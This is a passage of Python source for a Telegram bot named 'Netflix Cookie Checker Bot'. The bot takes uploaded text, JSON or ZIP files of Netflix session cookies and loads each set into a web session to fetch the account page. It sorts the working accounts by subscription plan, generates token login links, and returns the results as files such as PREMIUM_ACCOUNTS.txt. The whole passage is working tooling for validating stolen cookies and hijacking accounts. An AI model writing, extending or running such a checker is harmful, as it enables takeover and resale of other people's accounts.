    fname = doc.file_name
    start_time = time.time()
    
    if doc.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 5MB.")
        user_tasks[uid]['active'] = False
        return
    
    file = await doc.get_file()
    data = BytesIO()
    await file.download_to_memory(data)
    content = data.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if not bundles:
        await update.message.reply_text("❌ No valid cookies found.")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    total_bundles = len(bundles)
    await update.message.reply_text(f"📦 Found {total_bundles} cookie(s). Starting...")
    
    results_by_plan = {
        "premium": [], "standard": [], "basic": [], "mobile": [], "free": [], "partial": []
    }
    
    invalid_count = 0
    processed = 0
    
    status_msg = await update.message.reply_text(f"📥 Processing: {fname}\n\n{format_progress_message(0, total_bundles, 0, 0, 0, 0, 0, 0)}")
    
    for idx, bundle in enumerate(bundles, 1):
        if user_tasks[uid].get('cancel', False):
            await status_msg.edit_text("⏹️ Task cancelled")
            break
        
        result, plan_key, result_type = await process_single_bundle(update, context, bundle, fname, status_msg, idx, total_bundles)
        
        if result:
            if result_type == "success" and plan_key:
                results_by_plan[plan_key].append(result)
                results_by_plan[plan_key].append("\n" + "="*65 + "\n")
                stats['valid'] += 1
            elif result_type == "free" and plan_key:
                results_by_plan[plan_key].append(result)
                results_by_plan[plan_key].append("\n" + "="*65 + "\n")
                stats['free'] += 1
            elif result_type == "partial":
                results_by_plan["partial"].append(result)
                results_by_plan["partial"].append("\n" + "="*65 + "\n")
                stats['free'] += 1
        else:
            invalid_count += 1
            stats['failed'] += 1
        
        stats['total'] += 1
        processed += 1
        
        elapsed = time.time() - start_time
        premium_count = len(results_by_plan["premium"])
        speed = processed / elapsed if elapsed > 0 else 0
        remaining = total_bundles - processed
        eta = remaining / speed if speed > 0 else 0
        
        await status_msg.edit_text(format_progress_message(
            processed, total_bundles, stats['valid'], premium_count,
            len(results_by_plan["free"]), invalid_count, speed, eta
        ))
    
    if not user_tasks[uid].get('cancel', False):
        elapsed = time.time() - start_time
        spd = total_bundles / elapsed if elapsed > 0 else 0
        
        final = f"""
✅ Processing Complete

Total Cookies: {total_bundles}
Premium: {len(results_by_plan['premium'])}
Standard: {len(results_by_plan['standard'])}
Basic: {len(results_by_plan['basic'])}
Mobile: {len(results_by_plan['mobile'])}
Free: {len(results_by_plan['free'])}
Partial: {len(results_by_plan['partial'])}
Invalid: {invalid_count}

Time: {elapsed:.2f}s | Speed: {spd:.2f} acc/s
"""
        await status_msg.delete()
        await update.message.reply_text(final)
        
        for plan, results in results_by_plan.items():
            if results and plan != "partial":
                all_results = "".join(results)
                buf = BytesIO()
                buf.write(all_results.encode('utf-8'))
                buf.seek(0)
                filename = f"{plan.upper()}_ACCOUNTS.txt"
                await update.message.reply_document(document=buf, filename=filename, caption=f"📄 {len(results)} {plan.upper()} Accounts")
        
        if results_by_plan["partial"]:
            all_partial = "".join(results_by_plan["partial"])
            buf = BytesIO()
            buf.write(all_partial.encode('utf-8'))
            buf.seek(0)
            await update.message.reply_document(document=buf, filename="PARTIAL_DATA.txt", caption=f"⚠️ {len(results_by_plan['partial'])} Limited Data")
    
    user_tasks[uid]['active'] = False


# ==================== ZIP FILE HANDLER ====================

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start = time.time()
    
    if doc.file_size > 50 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 50MB")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📦 Processing ZIP: {fname}")
    file = await doc.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)
    
    results_by_plan = {
        "premium": [], "standard": [], "basic": [], "mobile": [], "free": [], "partial": []
    }
    
    invalid_count = 0
    total_files = 0
    processed = 0
    
    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
            total_files = len(files)
            if not files:
                await msg.edit_text("❌ No cookie files found")
                user_tasks[uid]['active'] = False
                return
            
            config, _ = load_config()
            
            for cf in files:
                if user_tasks[uid].get('cancel', False):
                    await msg.edit_text("⏹️ Task cancelled")
                    break
                
                try:
                    content = zf.read(cf).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    if not bundles:
                        invalid_count += 1
                        processed += 1
                        continue
                    
                    for bundle in bundles:
                        cookies = bundle.get("cookies", {})
                        if has_required_netflix_cookies(cookies):
                            nftoken_data, _ = create_nftoken(cookies, 1)
                            
                            session = requests.Session()
                            session.cookies.update(cookies)
                            html, status_code, account_info = get_account_page(session, None, 15)
                            
                            if account_info and has_any_account_info(account_info):
                                is_sub = is_subscribed_account(account_info)
                                result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cf, nftoken_data, config)
                                res = "\n".join(result_lines)
                                
                                if plan_key in results_by_plan:
                                    results_by_plan[plan_key].append(res)
                                    results_by_plan[plan_key].append("\n" + "="*65 + "\n")
                                    
                                if is_sub:
                                    stats['valid'] += 1
                                else:
                                    stats['free'] += 1
                            else:
                                email = account_info.get('email', 'Unknown') if account_info else 'Unknown'
                                partial_res = f"⚠️ Partial - {cf}\nEmail: {email}\n"
                                if nftoken_data:
                                    partial_res += f"NFToken: https://netflix.com/?nftoken={nftoken_data['token']}\n"
                                results_by_plan["partial"].append(partial_res)
                                results_by_plan["partial"].append("\n" + "="*65 + "\n")
                                stats['free'] += 1
                        else:
                            invalid_count += 1
                            stats['failed'] += 1
                        
                        stats['total'] += 1
                    
                    processed += 1
                    
                    elapsed = time.time() - start
                    premium_count = len(results_by_plan["premium"])
                    speed = processed / elapsed if elapsed > 0 else 0
                    remaining = total_files - processed
                    eta = remaining / speed if speed > 0 else 0
                    
                    await msg.edit_text(format_progress_message(
                        processed, total_files, stats['valid'], premium_count,
                        len(results_by_plan["free"]), invalid_count, speed, eta
                    ))
                    
                except Exception as e:
                    print(f"Error: {e}")
                    invalid_count += 1
                    processed += 1
        
        if not user_tasks[uid].get('cancel', False):
            elapsed = time.time() - start
            spd = total_files / elapsed if elapsed > 0 else 0
            
            final = f"""
✅ Processing Complete

Total Files: {total_files}
Premium: {len(results_by_plan['premium'])}
Standard: {len(results_by_plan['standard'])}
Basic: {len(results_by_plan['basic'])}
Mobile: {len(results_by_plan['mobile'])}
Free: {len(results_by_plan['free'])}
Partial: {len(results_by_plan['partial'])}
Invalid: {invalid_count}

Time: {elapsed:.2f}s | Speed: {spd:.2f} files/s
"""
            await msg.delete()
            await update.message.reply_text(final)
            
            for plan, results in results_by_plan.items():
                if results and plan != "partial":
                    all_results = "".join(results)
                    buf = BytesIO()
                    buf.write(all_results.encode('utf-8'))
                    buf.seek(0)
                    await update.message.reply_document(document=buf, filename=f"{plan.upper()}_ACCOUNTS.txt")
            
            if results_by_plan["partial"]:
                all_partial = "".join(results_by_plan["partial"])
                buf = BytesIO()
                buf.write(all_partial.encode('utf-8'))
                buf.seek(0)
                await update.message.reply_document(document=buf, filename="PARTIAL_DATA.txt")
                    
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        user_tasks[uid]['active'] = False


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fname = update.message.document.file_name.lower()
    if fname.endswith('.zip'):
        await handle_zip_file(update, context)
    elif fname.endswith('.txt') or fname.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("❌ Send .txt, .json, or .zip files")

async def set_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ])


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    try:
        import asyncio
        asyncio.get_event_loop().run_until_complete(set_commands(app))
    except:
        pass
    
    print("Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
